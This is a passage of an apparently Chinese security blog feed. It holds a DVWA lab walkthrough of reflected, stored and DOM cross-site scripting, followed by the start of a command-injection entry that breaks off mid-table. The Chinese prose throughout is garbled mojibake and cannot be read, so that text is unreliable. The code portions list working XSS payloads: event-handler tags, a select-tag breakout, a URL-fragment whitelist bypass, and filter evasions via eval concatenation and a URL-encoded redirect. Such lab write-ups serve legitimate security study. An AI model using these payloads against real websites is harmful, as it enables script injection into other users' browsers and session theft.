‡ç­¾æ¥ç»•è¿‡">ğŸ­</a>ä½¿ç”¨åˆ«çš„æ ‡ç­¾æ¥ç»•è¿‡</h3><p><code>&lt;body onload=alert('genius')&gt;</code></p><p><code>&lt;a href='' onclick=alert('genius')&gt;click&lt;/a&gt;</code></p><h2 id="high"><a class="header-anchor" href="#high">ğŸ­</a>high</h2><pre><code class="hljs autoit">$name = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[ <span class="hljs-string">&#x27;name&#x27;</span> ] )<span class="hljs-comment">;</span></code></pre><p>æœ¬å…³ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯¹<code>&lt;script&gt;</code>æ ‡ç­¾è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†æ²¡æœ‰è¿‡æ»¤åˆ«çš„æ ‡ç­¾ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€…iframe(åœ¨ä¸€ä¸ªHTMLä¸­åµŒå…¥å¦ä¸€ä¸ªHTML)ç­‰æ ‡ç­¾çš„srcæ³¨å…¥æ¶æ„çš„jsä»£ç .</p><p><code>&lt;body onload=alert('jisso')&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p><p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert('genius')&gt;</code></p><h2 id="impossible"><a class="header-anchor" href="#impossible">ğŸ­</a>impossible</h2><p><code>Anti-CSRF token</code>å®ƒåˆå‡ºæ¥äº†</p><p><code>htmlspecialchars()</code></p><p>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼š</p><ul><li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</li><li>&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &quot;</li><li>â€™ ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€™</li><li>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</li><li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</li></ul><p>è¯­æ³•</p><pre><code class="hljs applescript">htmlspecialchars(<span class="hljs-built_in">string</span>,flags,<span class="hljs-built_in">character</span>-<span class="hljs-keyword">set</span>,double_encode)</code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¦è½¬æ¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>flags</em></td><td>å¯é€‰ã€‚è§„å®šå¦‚ä½•å¤„ç†å¼•å·ã€æ— æ•ˆçš„ç¼–ç ä»¥åŠä½¿ç”¨å“ªç§æ–‡æ¡£ç±»å‹ã€‚                              å¯ç”¨çš„å¼•å·ç±»å‹ï¼š                                                                                                                                                                           ENT_COMPAT - é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·ã€‚                                                                                    ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚                                                                                           ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å·ã€‚</td></tr><tr><td><em>character-set</em></td><td>å¯é€‰ã€‚ä¸€ä¸ªè§„å®šäº†è¦ä½¿ç”¨çš„å­—ç¬¦é›†çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>double_encode</em></td><td>å¯é€‰ã€‚å¸ƒå°”å€¼ï¼Œè§„å®šäº†æ˜¯å¦ç¼–ç å·²å­˜åœ¨çš„ HTML å®ä½“ã€‚  TRUE - é»˜è®¤ã€‚å°†å¯¹æ¯ä¸ªå®ä½“è¿›è¡Œè½¬æ¢ã€‚ FALSE - ä¸ä¼šå¯¹å·²å­˜åœ¨çš„ HTML å®ä½“è¿›è¡Œç¼–ç ã€‚</td></tr></tbody></table><p>è¯¦æƒ…ï¼š<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">htmlspecialcharsï¼ˆï¼‰</a></p><h1>å­˜å‚¨å‹XSS</h1><p>å­˜å‚¨å‹XSSåˆç§°æŒä¹…å‹XSSï¼Œæ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ï¼Œå…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ã€‚</p><p>æ”»å‡»æ–¹å¼ï¼šè¿™ç§æ”»å‡»å¤šè§äºè®ºå›ã€åšå®¢å’Œç•™è¨€æ¿ï¼Œæ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥å¸–å­çš„å†…å®¹ä¸­ã€‚éšç€å¸–å­è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…åœ°è¢«å­˜æ”¾åœ¨æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œã€‚</p><h2 id="low-v2"><a class="header-anchor" href="#low-v2">ğŸ­</a>low</h2><p><img src="/2021/01/27/3/12.jpg" alt="12"></p><p>æœ¬å…³åªé˜²å¾¡äº†SQLæ³¨å…¥æ¼æ´ï¼Œå¹¶æ²¡æœ‰é˜²å¾¡xssæ¼æ´ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹ï¼š<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p><p>å‘ç°nameæ¡†é‡Œæœ€å¤šåªèƒ½è¾“å…¥10ä¸ªå­—ç¬¦ã€‚æœ‰ä»¥ä¸‹å‡ ç§åŠæ³•å¯ä»¥è¿›è¡Œæ”»å‡»ï¼š</p><h3 id="messageæ¡†ç¼–è¾‘"><a class="header-anchor" href="#messageæ¡†ç¼–è¾‘">ğŸ­</a>messageæ¡†ç¼–è¾‘</h3><p>nameé™åˆ¶äº†ä½†æ˜¯messageæ¡†æ²¡æœ‰å­—ç¬¦é™åˆ¶ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š</p><img src="/2021/01/27/3/13.jpg" alt="13" style="zoom:50%;"><p>messageæ¡†å¯ä»¥æ”»å‡»ï¼Œè¿™æ˜¯ä¸€ç§æ€è·¯ï¼›</p><h3 id="åœ¨nameæ¡†ç¼–è¾‘ï¼ŒæŠ“åŒ…ç¯¡æ”¹"><a class="header-anchor" href="#åœ¨nameæ¡†ç¼–è¾‘ï¼ŒæŠ“åŒ…ç¯¡æ”¹">ğŸ­</a>åœ¨nameæ¡†ç¼–è¾‘ï¼ŒæŠ“åŒ…ç¯¡æ”¹</h3><p>æŠ“åŒ…ååœ¨nameæ¡†ç¼–è¾‘å³å¯ã€‚</p><h3 id="åœ¨jså‰ç«¯ä¿®æ”¹å‚æ•°"><a class="header-anchor" href="#åœ¨jså‰ç«¯ä¿®æ”¹å‚æ•°">ğŸ­</a>åœ¨jså‰ç«¯ä¿®æ”¹å‚æ•°</h3><img src="/2021/01/27/3/15.jpg" alt="15" style="zoom:67%;"><p>å°†<code>maxlength</code>å‚æ•°å€¼æ”¹å¤§å³å¯ã€‚</p><h3 id="å€ŸåŠ©ç«ç‹çš„æ’ä»¶Tamper-Data"><a class="header-anchor" href="#å€ŸåŠ©ç«ç‹çš„æ’ä»¶Tamper-Data">ğŸ­</a>å€ŸåŠ©ç«ç‹çš„æ’ä»¶Tamper Data</h3><img src="/2021/01/27/3/17.jpg" alt="17" style="zoom:50%;"><p>ä¸€æ ·åœ¨messageç¼–å†™</p><img src="/2021/01/27/3/16.jpg" alt="16" style="zoom:50%;"><p>æœ¬ä¸åœ¨messageæ¡†ç¼–å†™æ— å¤ªå¤§å·®å¼‚ï¼Œä½†è¿™ä¸ªæ’ä»¶åªè¦éšæ„è¾“å…¥å€¼ï¼Œæ— éœ€æ„é€ xsså³å¯è·å–cookieå€¼ï¼Œä¸”å¯ç¯¡æ”¹å¤´æ–‡ä»¶ç­‰å¤šä¸ªä¿¡æ¯ã€‚</p><h2 id="medium-v2"><a class="header-anchor" href="#medium-v2">ğŸ­</a>medium</h2><p><img src="/2021/01/27/3/18.jpg" alt="18"></p><p><code>addslashes() </code>å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆ'ï¼‰</li><li>åŒå¼•å·ï¼ˆ&quot;ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li><li>NULL</li></ul><p>åªå¯¹<code>&lt;script&gt;</code>æ›¿æ¢ï¼Œä¸åå°„å‹xssçš„mediumä¸€æ ·,<code>&lt;script&gt;</code>çš„åµŒå¥—å¤§å°å†™ç»•è¿‡ï¼Œæ ‡ç­¾ç»•è¿‡(å¦‚ä¸‹)ï¼Œä¾æ—§ç”¨ä¿®æ”¹jså‰ç«¯ï¼Œæˆ–è€…æŠ“åŒ…çš„æ–¹æ³•</p><p><code>&lt;body onload=alert('jisso')&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p><p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert('genius')&gt;</code></p><h2 id="high-v2"><a class="header-anchor" href="#high-v2">ğŸ­</a>high</h2><pre><code class="hljs stata"><span class="hljs-variable">$name</span> = preg_replace( &#x27;/&lt;(.*)<span class="hljs-built_in">s</span>(.*)c(.*)<span class="hljs-built_in">r</span>(.*)<span class="hljs-built_in">i</span>(.*)p(.*)t/i&#x27;, &#x27;&#x27;, <span class="hljs-variable">$name</span> );</code></pre><p>ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œå¯¹<code>&lt;script&gt;</code>å¤„ç†ä¸åŒï¼Œæœ¬å…³ç”¨æ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œæ•…æ–¹æ³•ä¸ä¸Šä¸€å…³ç›¸åŒï¼Œ<code>&lt;script&gt;</code>çš„åµŒå¥—å’Œå¤§å°å†™ç»•è¿‡ä¸å¯ç”¨ã€‚</p><h2 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">ğŸ­</a>impossible</h2><p><img src="/2021/01/27/3/19.jpg" alt="19"></p><h1>DOM XSS</h1><p>DOMå…¨ç§°Doument Object Modelï¼Œä½¿ç”¨DOMå¯ä»¥ä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„åŠæ ·å¼ã€‚<br>DOMå‹XSSå…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šçš„åå°„å‹XSSï¼Œå®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ã€‚HTMLçš„æ ‡ç­¾éƒ½æ˜¯èŠ‚ç‚¹ï¼Œè€Œè¿™äº›èŠ‚ç‚¹ç»„æˆäº†DOMçš„æ•´ä½“ç»“æ„â€”â€”èŠ‚ç‚¹æ ‘ã€‚é€šè¿‡HTML DOM,æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹å‡å¯é€šè¿‡JavaScriptè¿›è¡Œè®¿é—®ã€‚æ‰€æœ‰HTMLå…ƒç´ (èŠ‚ç‚¹)å‡å¯è¢«ä¿®æ”¹ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºæˆ–åˆ é™¤èŠ‚ç‚¹ã€‚HTMLDOMæ ‘ç»“æ„å¦‚ä¸‹</p><p><img src="/2021/01/27/3/20.jpg" alt="20"></p><p>åœ¨ç½‘ç«™é¡µé¢ä¸­æœ‰è®¸å¤šå…ƒç´ ï¼Œå½“é¡µé¢åˆ°è¾¾æµè§ˆå™¨æ—¶ï¼Œæµè§ˆå™¨ä¼šä¸ºé¡µé¢åˆ›å»ºä¸€ä¸ªé¡¶çº§çš„Documentobjectæ–‡æ¡£å¯¹è±¡ï¼Œæ¥ç€ç”Ÿæˆå„ä¸ªå­æ–‡æ¡£å¯¹è±¡ï¼Œæ¯ä¸ªé¡µé¢å…ƒç´ å¯¹åº”ä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ï¼Œæ¯ä¸ªæ–‡æ¡£å¯¹è±¡åŒ…å«å±æ€§ã€æ–¹æ³•å’Œäº‹ä»¶ã€‚å¯ä»¥é€šè¿‡JSè„šæœ¬å¯¹æ–‡æ¡£å¯¹è±¡è¿›è¡Œç¼–è¾‘ï¼Œä»è€Œä¿®æ”¹é¡µé¢çš„å…ƒç´ ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€ä¿®æ”¹é¡µé¢å†…å®¹ï¼Œä»å®¢æˆ·ç«¯è·å–DOMä¸­çš„æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦ä¸æœåŠ¡å™¨ç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚<br>æ”»å‡»æ–¹å¼ï¼šç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æäº¤ï¼Œä¸”åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚</p><h2 id="low-v3"><a class="header-anchor" href="#low-v3">ğŸ­</a>low</h2><p>æ— ä»»ä½•å¤„ç†ï¼Œç›´æ¥åœ¨urlç¼–å†™<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p><img src="/2021/01/27/3/21.jpg" alt="21" style="zoom:50%;"><h2 id="medium-v3"><a class="header-anchor" href="#medium-v3">ğŸ­</a>medium</h2><p><img src="/2021/01/27/3/22.jpg" alt="22"></p><p>ç›¸å½“äºå°†<code>&lt;script&gt;</code>è¿‡æ»¤æ‰ï¼Œå…¶å®ƒæ ‡ç­¾è¿˜æ˜¯å¯ä»¥ä½¿ç”¨çš„<code>&lt;img  src=1  Î¿nerrÎ¿r=('hack')&gt;</code>ï¼Œå¹¶æ²¡æœ‰å¼¹æ¡†</p><img src="/2021/01/27/3/23.jpg" alt="23" style="zoom:67%;"><p>ç¡®å®æ’å…¥äº†ï¼Œä½†æ’å…¥çš„ä»£ç å¹¶æ²¡æœ‰åœ¨<code>&lt;option&gt;</code>æ ‡ç­¾å€¼ä¸­ï¼Œæ•…è¦æ„é€ <code>&gt;&lt;option&gt;&lt;img src=1 onerror=alert('hack')&gt;</code>æ¥é—­åˆï¼Œä½†ä¾æ—§ä¸èƒ½å¼¹æ¡†ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°å‰é¢è¿˜æœ‰ä¸€ä¸ª<code>&lt;select&gt;</code>,æ•…æˆ‘ä»¬è¦æ„é€ ä¸€ä¸ªç‹¬ç«‹è¯­å¥æ‰“ç ´<code>&lt;select&gt;</code>æ ‡ç­¾çš„é™åˆ¶ï¼š<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('hack')&gt;</code></p><img src="/2021/01/27/3/24.jpg" alt="24" style="zoom:50%;"><p>æˆåŠŸ~</p><h2 id="high-v3"><a class="header-anchor" href="#high-v3">ğŸ­</a>high</h2><p>ç™½åå• ï¼šåªå…è®¸ä¸Šä¼   French  English German  Spanish ä¸­ä¸€ä¸ªï¼Œå› ä¸ºURLä¸­#å·ä¹‹åçš„å†…å®¹ä¸ä¼šè¢«æäº¤åˆ°æœåŠ¡å™¨ï¼Œæ•…å¯ä»¥æ„é€ ï¼š<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="impossible-v3"><a class="header-anchor" href="#impossible-v3">ğŸ­</a>impossible</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># Don&#x27;t need to do anything, protction handled on the client side</span><span class="hljs-meta">?&gt;</span></code></pre><p>ä¿æŠ¤åœ¨å®¢æˆ·ç«¯å¤„ç†ï¼Œå…ˆç¼–å†™æµ‹è¯•çœ‹çœ‹</p><p><img src="/2021/01/27/3/26.jpg" alt="26"></p><p>å‘ç°è¾“å…¥çš„å‚æ•°å¹¶æ²¡æœ‰è¿›è¡ŒURLè§£ç </p><p><img src="/2021/01/27/3/25.jpg" alt="25"></p><p>æ•…XSSæ¼æ´ä¸å­˜åœ¨.</p><h1>æ€»ç»“</h1><p>å•æ˜¯åˆ·dvwaå¹¶ä¸èƒ½å…¨é¢äº†è§£XSSï¼Œè¿˜æœ‰ä¸€äº›æœ¬æ¬¡é¶åœºæ²¡ç”¨åˆ°çš„æ ‡ç­¾ï¼š</p><p><code>&lt;input&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;) <span class="hljs-attr">autofocus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span>é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</code></pre><p><code>&lt;details&gt;</code></p><pre><code class="hljs routeros">&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;ä½¿ç”¨openå±æ€§è§¦å‘ontoggleäº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘&lt;details open <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</code></pre><p><code>&lt;svg&gt;</code></p><pre><code class="hljs abnf">&lt;svg onload=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><p><code>&lt;video&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></code></pre><p><code>&lt;audio&gt;</code></p><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=x  <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;);&gt;</code></pre><p><code>&lt;textarea&gt;</code></p><pre><code class="hljs abnf">&lt;textarea onfocus=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">; autofocus&gt;</span></code></pre><p>è¿˜æœ‰ç»•è¿‡æ–¹æ³•:</p><h3 id="è¿‡æ»¤ç©ºæ ¼"><a class="header-anchor" href="#è¿‡æ»¤ç©ºæ ¼">ğŸ­</a>è¿‡æ»¤ç©ºæ ¼</h3><p>ç”¨<code>/</code>ä»£æ›¿ç©ºæ ¼</p><pre><code class="hljs abnf">&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><h3 id="å­—ç¬¦æ‹¼æ¥"><a class="header-anchor" href="#å­—ç¬¦æ‹¼æ¥">ğŸ­</a>å­—ç¬¦æ‹¼æ¥</h3><p>åˆ©ç”¨eval</p><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</code></pre><p>åˆ©ç”¨top</p><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span>top[<span class="hljs-string">&quot;al&quot;+&quot;ert&quot;</span>](<span class="hljs-link">`xss`</span>);<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><h3 id="ç¼–ç ç»•è¿‡"><a class="header-anchor" href="#ç¼–ç ç»•è¿‡">ğŸ­</a>ç¼–ç ç»•è¿‡</h3><ul><li>Unicodeç¼–ç ç»•è¿‡</li><li>urlç¼–ç ç»•è¿‡</li><li>Asciiç ç»•è¿‡</li><li>hexç»•è¿‡</li><li>å…«è¿›åˆ¶</li><li>base64ç»•è¿‡</li></ul><h3 id="è¿‡æ»¤æ‹¬å·"><a class="header-anchor" href="#è¿‡æ»¤æ‹¬å·">ğŸ­</a>è¿‡æ»¤æ‹¬å·</h3><p>å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡</p><h3 id="è¿‡æ»¤urlåœ°å€"><a class="header-anchor" href="#è¿‡æ»¤urlåœ°å€">ğŸ­</a>è¿‡æ»¤urlåœ°å€</h3><h4 id="ä½¿ç”¨urlç¼–ç "><a class="header-anchor" href="#ä½¿ç”¨urlç¼–ç ">ğŸ­</a>ä½¿ç”¨urlç¼–ç </h4><pre><code class="hljs xquery">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror<span class="hljs-built_in">=document</span>.location=`http://<span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%69</span><span class="hljs-meta">%64</span><span class="hljs-meta">%75</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%6d</span>/`&gt;</code></pre><h4 id="ä½¿ç”¨IP"><a class="header-anchor" href="#ä½¿ç”¨IP">ğŸ­</a>ä½¿ç”¨IP</h4><ul><li>åè¿›åˆ¶IP</li><li>å…«è¿›åˆ¶IP</li><li>hex</li><li>htmlæ ‡ç­¾ä¸­ç”¨<code>//</code>å¯ä»¥ä»£æ›¿<code>http://</code></li></ul><p>è¯¦è§ï¼š<a href="https://xz.aliyun.com/t/4067">XSS</a></p><p>ç»“æŸ~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Command Injection</title>
    <link href="/2021/01/26/dvwa4/"/>
    <url>/2021/01/26/dvwa4/</url>
    
    <content type="html"><![CDATA[<p>å‘½ä»¤æ³¨å…¥æ”»å‡»çš„å¸¸è§åœºæ™¯ä¸ºï¼šä»…ä»…éœ€è¦è¾“å…¥æ•°æ®çš„åœºåˆï¼Œæ”»å‡»è€…æ„é€ æ•°æ®åŒæ—¶è¾“å…¥äº†æ¶æ„å‘½ä»¤ä»£ç ï¼Œè€Œç³»ç»Ÿå¯¹æ­¤å¹¶æœªè¿‡æ»¤ï¼Œæ¶æ„å‘½ä»¤ä»£ç ä¸€å¹¶æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–è€…æ­£å¸¸æ•°æ®çš„ç ´åï¼›PHPå‘½ä»¤æ³¨å…¥æ”»å‡»æ¼æ´æ˜¯PHPåº”ç”¨ç¨‹åºä¸­å¸¸è§çš„è„šæœ¬æ¼æ´ä¹‹ä¸€ã€‚å‘½ä»¤æ³¨å…¥å’Œä»£ç æ³¨å…¥ä¸åŒï¼Œä»£ç æ³¨å…¥çš„ç›®çš„åœ¨äºå°†å¤–éƒ¨ä»£ç æ³¨å…¥åº”ç”¨ç¨‹åºæœ¬èº«ï¼Œå¹¶éšç¨‹åºæ‰§è¡Œï¼›å‘½ä»¤æ”»å‡»çš„å¯¹è±¡æ˜¯æœåŠ¡å™¨çš„å®¿ä¸»æœºã€‚å› æ­¤ç”¨æˆ·å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥è¾¾åˆ°å…¥ä¾µç›®çš„ã€‚</p><p>å…ˆä»‹ç»ä¸€ä¸‹<code>ping</code>:</p><p>Pingæ˜¯æ½œæ°´è‰‡äººå‘˜çš„ä¸“ç”¨æœ¯è¯­ï¼Œè¡¨ç¤ºå›åº”çš„å£°çº³è„‰å†²ï¼Œåœ¨ç½‘ç»œä¸­Pingæ˜¯TCP/IPå·¥å…·ã€‚æ˜¯ç”¨æ¥æ£€æµ‹ç½‘ç»œçš„è¿é€šæƒ…å†µå’Œåˆ†æç½‘ç»œé€Ÿåº¦ã€‚</p><p><img src="/2021/01/26/dvwa4/3.jpg" alt="3"></p><p>pingè¿”å›ä¿¡æ¯çš„å«ä¹‰</p><table><thead><tr><th>è¿”å›ä¿¡æ¯</th><th>åˆ†æ</th></tr></thead><tbody><tr><td>Request timed out</td><td>(1)å¯¹æ–¹å·²å…³æœºï¼Œæˆ–è€…ç½‘ç»œä¸Šæ²¡æœ‰è¿™ä¸ªåœ°å€                                                                                    (2)å¯¹æ–¹ä¸æœ¬æœºä¸åœ¨åŒä¸€ç½‘æ®µå†…                                                                                                 (3)å¯¹æ–¹ç¡®å®å­˜åœ¨ï¼Œä½†è®¾ç½®äº†ICMPæ•°æ®åŒ…è¿‡æ»¤(æ¯”å¦‚é˜²ç«å¢™è®¾ç½®)ï¼Œå¯ä»¥ç”¨å¸¦å‚æ•° -a çš„Pingå‘½ä»¤æ¢æµ‹å¯¹æ–¹ï¼Œå¦‚æœèƒ½å¾—åˆ°å¯¹æ–¹çš„<code>NETBIOS</code>åç§°ï¼Œåˆ™è¯´æ˜å¯¹æ–¹æ˜¯å­˜åœ¨çš„ï¼Œæœ‰é˜²ç«å¢™è®¾ç½®ï¼Œå¦‚æœå¾—ä¸åˆ°å°±å¦‚(1),(2)                                                                                          (4)é”™è¯¯è®¾ç½®IPåœ°å€(TCP/IPè®¾ç½®ä¸­ï¼Œè®¾ç½®äº†ä¸€ä¸ªä¸ç½‘å¡IPåœ°å€å¤„äºåŒä¸€å­ç½‘çš„IPåœ°å€)</td></tr><tr><td>Destination host Unreachable</td><td>(1)å¯¹æ–¹ä¸æœ¬æœºä¸åœ¨åŒä¸€ç½‘æ®µå†…ï¼Œè€Œæœ¬æœºæœªè®¾ç½®é»˜è®¤çš„è·¯ç”±                                        ã€€(2) ç½‘çº¿ å‡ºäº†æ•…éšœ                                                                                                                                  <strong>æœ¬å›åº”ä¸<code>time out</code>çš„åŒºåˆ«ï¼š<code>timeout</code>ï¼šæ‰€ç»è¿‡çš„è·¯ç”±å™¨çš„è·¯ç”±è¡¨ä¸­å…·æœ‰åˆ°è¾¾ç›®æ ‡çš„è·¯ç”±ï¼Œè€Œç›®æ ‡å› ä¸ºå…¶ä»–åŸå› ä¸å¯åˆ°è¾¾ï¼Œæœ¬å›åº”ï¼šè·¯ç”±è¡¨ä¸­è¿åˆ°è¾¾ç›®æ ‡çš„è·¯ç”±éƒ½æ²¡æœ‰</strong></td></tr><tr><td>Bad IP address</td><td>è¿™ä¸ªä¿¡æ¯è¡¨ç¤ºæ‚¨å¯èƒ½æ²¡æœ‰è¿æ¥åˆ°DNSæœåŠ¡å™¨ï¼Œæ‰€ä»¥æ— æ³•è§£æè¿™ä¸ªIPåœ°å€ï¼Œä¹Ÿå¯èƒ½æ˜¯IPåœ°å€ä¸å­˜åœ¨ã€‚</td></tr><tr><td>Source quench received</td><td>å¯¹æ–¹æˆ–ä¸­é€”çš„æœåŠ¡å™¨ç¹å¿™æ— æ³•å›åº”</td></tr><tr><td>Unknown 